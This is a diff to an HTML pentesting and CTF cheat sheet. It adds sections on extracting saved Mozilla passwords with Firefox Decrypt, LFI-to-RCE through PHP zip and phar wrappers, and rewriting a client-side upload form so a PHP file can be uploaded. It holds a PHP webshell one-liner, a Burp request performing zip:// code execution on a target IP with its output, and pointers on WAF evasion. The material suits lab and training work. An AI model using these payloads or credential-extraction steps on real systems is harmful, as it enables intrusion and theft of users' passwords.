@@ -268,6 +268,10 @@
 <li><a class="reference internal" href="#ss">ss</a></li>
 </ul>
 </li>
+<li><a class="reference internal" href="#user-home-directory">User Home Directory</a><ul>
+<li><a class="reference internal" href="#firefox-thunderbird-seabird">Firefox/ Thunderbird/ Seabird</a></li>
+</ul>
+</li>
 <li><a class="reference internal" href="#sudoers-file">Sudoers file</a><ul>
 <li><a class="reference internal" href="#secure-path">secure_path</a></li>
 <li><a class="reference internal" href="#env-reset">env_reset</a></li>
@@ -306,6 +310,8 @@
 <li><a class="reference internal" href="#lfi-to-remote-code-execution">LFI to Remote Code Execution</a><ul>
 <li><a class="reference internal" href="#file-upload-forms-functions">File upload forms/ functions</a></li>
 <li><a class="reference internal" href="#php-wrapper-expect-command">PHP wrapper expect://command</a></li>
+<li><a class="reference internal" href="#php-wrapper-zip">PHP Wrapper zip</a></li>
+<li><a class="reference internal" href="#php-wrapper-phar">PHP Wrapper phar</a></li>
 <li><a class="reference internal" href="#php-wrapper-php-file">PHP wrapper php://file</a></li>
 <li><a class="reference internal" href="#php-wrapper-php-filter">PHP wrapper php://filter</a></li>
 <li><a class="reference internal" href="#php-input-stream">PHP input:// stream</a></li>
@@ -322,6 +328,7 @@
 <li><a class="reference internal" href="#examples">Examples</a><ul>
 <li><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
 <li><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
+<li><a class="reference internal" href="#modifying-file-upload-page">Modifying File Upload Page</a></li>
 </ul>
 </li>
 </ul>
@@ -1723,6 +1730,7 @@ SeDebugPrivilege
 <li>What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).</li>
 <li>What are the services running? (netstat -ln)</li>
 <li>Check the entries in the crontab!</li>
+<li>What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.</li>
 </ul>
 <div class="section" id="what-advanced-linux-file-permissions-are-used">
 <h4>What “Advanced Linux File Permissions” are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Permalink to this headline">¶</a></h4>
@@ -2369,7 +2377,7 @@ IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
 </div>
 <p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
 <ul class="simple">
-<li>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64)</li>
+<li>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer <a class="reference external" href="https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/">PowerShell –EncodedCommand and Round-Trips</a></li>
 <li>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</li>
 </ul>
 <blockquote>
@@ -2985,6 +2993,14 @@ if __name__ == &quot;__main__&quot;:
 </div>
 </div>
 </div>
+<div class="section" id="user-home-directory">
+<h3>User Home Directory<a class="headerlink" href="#user-home-directory" title="Permalink to this headline">¶</a></h3>
+<p>If we find that home directory contains</p>
+<div class="section" id="firefox-thunderbird-seabird">
+<h4>Firefox/ Thunderbird/ Seabird<a class="headerlink" href="#firefox-thunderbird-seabird" title="Permalink to this headline">¶</a></h4>
+<p>We can utilize <a class="reference external" href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.</p>
+</div>
+</div>
 <div class="section" id="sudoers-file">
 <h3>Sudoers file<a class="headerlink" href="#sudoers-file" title="Permalink to this headline">¶</a></h3>
 <p>If the sudoers file contains:</p>
@@ -3450,7 +3466,7 @@ print &quot;* * * * * root /bin/bash /home/username/evilscript&quot;
 <div class="highlight-None"><div class="highlight"><pre><span></span>curl -A &quot;bitvijays&quot; -i &quot;http://IPAddress/example?parameter=&#39; whoami&#39;&quot;
 </pre></div>
 </div>
-<p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a>
+<p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a> ! Amazing stuff here!
 Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.</p>
 </li>
 <li><p class="first">Similar to ls there is dir in linux. Try “dir -l” Might be helpful sometimes.</p>
@@ -3646,6 +3662,44 @@ Warning: include(expect://ls): failed to open stream: No such file or directory 
 Warning: include(): Failed opening &#39;expect://ls&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /var/www/fileincl/example1.php on line 7
 </pre></div>
 </div>
+</div>
+<div class="section" id="php-wrapper-zip">
+<h4>PHP Wrapper zip<a class="headerlink" href="#php-wrapper-zip" title="Permalink to this headline">¶</a></h4>
+<p>Let’s say there is a upload functionality on the victim machine, however the file saved doesn’t have executeable permission, in that case if we upload a zip file containing a shellcode such as</p>
+<p>Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the “system” is blocked use, scandir() for directory listing etc. )</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;&lt;?php system(&quot;ls&quot;); ?&gt;&quot; &gt; shell.php
+</pre></div>
+</div>
+<p>and</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>zip shell.zip shell.php
+</pre></div>
+</div>
+<p>Now, if we upload this zip file somehow to the victim machine and know it’s location (Let’s say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution</p>
+<p><a class="reference external" href="http://php.net/manual/en/wrappers.compression.php">Zip Usage</a></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>zip://archive.zip#dir/file.txt
+</pre></div>
+</div>
+<p>Burp Request</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>GET /?op=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+Host: 10.50.66.93
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+%23 is the #
+</pre></div>
+</div>
+<p>and we get RCE</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>home.php
+index.php
+upload.php
+uploads
+view.php
+</pre></div>
+</div>
+<p>We may read more about it at <a class="reference external" href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up</a> or <a class="reference external" href="https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur">CodeGate General CTF 2015: Owlur</a> – Read other write-ups in this.</p>
+</div>
+<div class="section" id="php-wrapper-phar">
+<h4>PHP Wrapper phar<a class="headerlink" href="#php-wrapper-phar" title="Permalink to this headline">¶</a></h4>
+<p>RCE can also be done using <a class="reference external" href="http://php.net/manual/en/phar.using.stream.php">Using Phar Archives: the phar stream wrapper</a></p>
 </div>
 <div class="section" id="php-wrapper-php-file">
 <h4>PHP wrapper php://file<a class="headerlink" href="#php-wrapper-php-file" title="Permalink to this headline">¶</a></h4>
@@ -3892,6 +3946,46 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 <p class="last">Do check the source code of the page for any client-side file validation or any commented hidden parameters?</p>
 </div>
 <p>We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.</p>
+</div>
+<div class="section" id="modifying-file-upload-page">
+<h4>Modifying File Upload Page<a class="headerlink" href="#modifying-file-upload-page" title="Permalink to this headline">¶</a></h4>
+<p>Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there’s a LFI and we have seen the code of upload function. The first thing to check would be “What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc.”</p>
+<p>Let’s say, there is a upload form which has a text-field for accepting input (Let’s say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let’s see the current form in inspect-element.</p>
+<p>Client-Side Code</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?op=upload&quot; method=&quot;POST&quot;&gt;
+   &lt;textarea style=&quot;width:400px; height:150px;&quot; id=&quot;sinfo&quot; name=&quot;sinfo&quot;&gt; &lt;/textarea&gt;&lt;br&gt;
+       &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; value=&quot;&quot; style=&quot;width:355px;&quot;&gt;
+   &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send Tip!&quot;&gt;
+&lt;/form&gt;
+</pre></div>
+</div>
+<p>If we see the above form, accepts two inputs</p>
+<ul class="simple">
+<li>text type field named sinfo for providing detailed information about the server and</li>
+<li>text type field named name for providing name of the server.</li>
+</ul>
+<p>Let’s also see, serverside code</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>if(isset($_POST[&#39;submit&#39;]) &amp;&amp; isset($_POST[&#39;sinfo&#39;])) {
+               $tip = $_POST[&#39;sinfo&#39;];
+               $secretname = genFilename();  ## Generates a random file name
+               file_put_contents(&quot;uploads/&quot;. $client_ip . &#39;/&#39; . $secretname,  $sinfo);
+</pre></div>
+</div>
+<p>If we see, the contents of sinfo are directly put in a file.</p>
+<p>In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?op=upload&quot; method=&quot;POST&quot;&gt;
+#  &lt;textarea style=&quot;width:400px; height:150px;&quot; id=&quot;sinfo&quot; name=&quot;sinfo&quot;&gt; &lt;/textarea&gt;&lt;br&gt; ---------- We have commented this and add the below line.
+       &lt;input type=&quot;file&quot; id=&quot;sinfo&quot; name=&quot;sinfo&quot; value=&quot;&quot; style=&quot;width:355px;&quot;&gt;
+       &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; value=&quot;&quot; style=&quot;width:355px;&quot;&gt;
+   &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send Tip!&quot;&gt;
+&lt;/form&gt;
+</pre></div>
+</div>
+<p>Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.</p>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
+</div>
 </div>
 </div>
 </div>
